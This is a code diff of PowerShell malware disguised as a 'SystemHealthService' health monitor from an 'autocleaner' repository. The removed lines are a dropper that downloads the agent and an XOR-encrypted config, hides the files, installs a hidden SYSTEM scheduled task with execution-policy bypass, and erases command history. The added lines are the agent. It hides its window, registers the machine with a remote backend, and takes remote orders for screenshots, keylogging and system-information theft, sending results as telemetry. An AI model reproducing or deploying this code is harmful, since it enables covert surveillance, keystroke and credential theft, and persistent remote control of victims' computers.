@@ -1,23 +1,14 @@
-$agentUrl  = "https://raw.githubusercontent.com/saiyanjohan580-boop/autocleaner/refs/heads/main/HealthMonitor.ps1"
-$configUrl = "https://raw.githubusercontent.com/saiyanjohan580-boop/autocleaner/refs/heads/main/config.enc"
-$key = "S3cr3tK3y2024!"
-# Use ProgramData - accessible by SYSTEM account
-$basePath = "C:\ProgramData\SystemHealthService"
-$null = New-Item -ItemType Directory -Path $basePath -Force -ErrorAction SilentlyContinue
-attrib +h $basePath
-$wc = New-Object System.Net.WebClient
-$wc.DownloadFile($agentUrl, "$basePath\HealthMonitor.ps1")
-attrib +h "$basePath\HealthMonitor.ps1"
-$encryptedBase64 = $wc.DownloadString($configUrl)
-$encrypted = [Convert]::FromBase64String($encryptedBase64)
-$keyBytes = [System.Text.Encoding]::UTF8.GetBytes($key)
-$decrypted = New-Object byte[] $encrypted.Length
-for ($i = 0; $i -lt $encrypted.Length; $i++) { $decrypted[$i] = $encrypted[$i] -bxor $keyBytes[$i % $keyBytes.Length] }
-[System.IO.File]::WriteAllBytes("$basePath\config.json", $decrypted)
-attrib +h "$basePath\config.json"
-$taskAction = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$basePath\HealthMonitor.ps1`""
-schtasks /create /tn "SystemHealthMonitor" /tr $taskAction /sc onstart /ru SYSTEM /rl HIGHEST /f
-schtasks /run /tn "SystemHealthMonitor"
-Clear-History
-Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
-exit
+$ErrorActionPreference="SilentlyContinue";$ProgressPreference="SilentlyContinue"
+try{Add-Type -Name W -Namespace N -MemberDefinition '[DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr h,Int32 n);';[N.W]::ShowWindow([N.W]::GetConsoleWindow(),0)}catch{}
+$p="C:\ProgramData\SystemHealthService";while(!(Test-Connection -ComputerName "8.8.8.8" -Count 1 -Quiet)){Start-Sleep 5};Start-Sleep 5
+$cfg=Get-Content "$p\config.json" -Raw|ConvertFrom-Json;$idf="$p\device_id.txt"
+if(Test-Path $idf){$did=(Get-Content $idf -Raw).Trim()}else{$did=[guid]::NewGuid().ToString();$did|Out-File $idf -NoNewline;(Get-Item $idf).Attributes="Hidden"}
+$dn=-join((65..90)+(97..122)|Get-Random -Count 8|%{[char]$_})
+$h=@{"apikey"=$cfg.supabase_key;"Authorization"="Bearer $($cfg.supabase_key)";"Content-Type"="application/json";"Prefer"="return=minimal"}
+function I{param($e,$m="GET",$b=$null);$uri="$($cfg.supabase_url)/rest/v1/$e";try{if($b){Invoke-RestMethod -Uri $uri -Method $m -Headers $h -Body ($b|ConvertTo-Json -Depth 10 -Compress) -TimeoutSec 30}else{Invoke-RestMethod -Uri $uri -Method $m -Headers $h -TimeoutSec 30}}catch{$null}}
+$r=@{device_id=$did;device_name=$dn;hostname=$env:COMPUTERNAME;username=$env:USERNAME;os_info=(Get-CimInstance Win32_OperatingSystem).Caption};I -e "devices" -m "POST" -b $r
+function D{try{Add-Type -AssemblyName System.Windows.Forms,System.Drawing;$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;$b=New-Object System.Drawing.Bitmap($s.Width,$s.Height);$g=[System.Drawing.Graphics]::FromImage($b);$g.CopyFromScreen($s.Location,[System.Drawing.Point]::Empty,$s.Size);$m=New-Object System.IO.MemoryStream;$b.Save($m,[System.Drawing.Imaging.ImageFormat]::Png);$x=[Convert]::ToBase64String($m.ToArray());$g.Dispose();$b.Dispose();$m.Dispose();@{data_type="display";file_data=$x}}catch{@{data_type="display";data="Failed"}}}
+function K{param($dur=60);try{Add-Type -AssemblyName System.Windows.Forms;Add-Type -MemberDefinition '[DllImport("user32.dll")]public static extern short GetAsyncKeyState(int v);' -Name KS -Namespace U;$ks=[System.Collections.ArrayList]@();$end=(Get-Date).AddSeconds($dur);while((Get-Date) -lt $end){for($v=8;$v -le 190;$v++){if([U.KS]::GetAsyncKeyState($v) -eq -32767){$null=$ks.Add(([System.Windows.Forms.Keys]$v).ToString())}};Start-Sleep -Milliseconds 10};@{data_type="input";data=($ks -join " ")}}catch{$null}}
+function S{try{$os=Get-CimInstance Win32_OperatingSystem;$c=Get-CimInstance Win32_ComputerSystem;@{data_type="sysinfo";data=(@{hostname=$env:COMPUTERNAME;username=$env:USERNAME;os=$os.Caption;os_version=$os.Version;manufacturer=$c.Manufacturer;model=$c.Model;memory_gb=[math]::Round($c.TotalPhysicalMemory/1GB,2)}|ConvertTo-Json -Compress)}}catch{$null}}
+$si=if($cfg.sync_interval){$cfg.sync_interval}else{60};$ri=if($cfg.retry_interval){$cfg.retry_interval}else{60}
+while($true){try{I -e "devices?device_id=eq.$did" -m "PATCH" -b @{last_sync=(Get-Date -Format "o")}|Out-Null;$ts=I -e "tasks?device_id=eq.$did&status=eq.pending&select=id,task_type,task_params";if($ts){if($ts -isnot [array]){$ts=@($ts)};foreach($t in $ts){$tl=$null;switch($t.task_type){"display_capture"{$tl=D}"input_monitor"{$dur=60;if($t.task_params -and $t.task_params.duration){$dur=[int]$t.task_params.duration};$tl=K -dur $dur}"system_info"{$tl=S}};if($tl){$tl.device_id=$did;I -e "telemetry" -m "POST" -b $tl|Out-Null;I -e "tasks?id=eq.$($t.id)" -m "PATCH" -b @{status="complete";completed_at=(Get-Date -Format "o")}|Out-Null}}};Start-Sleep $si}catch{Start-Sleep $ri}}
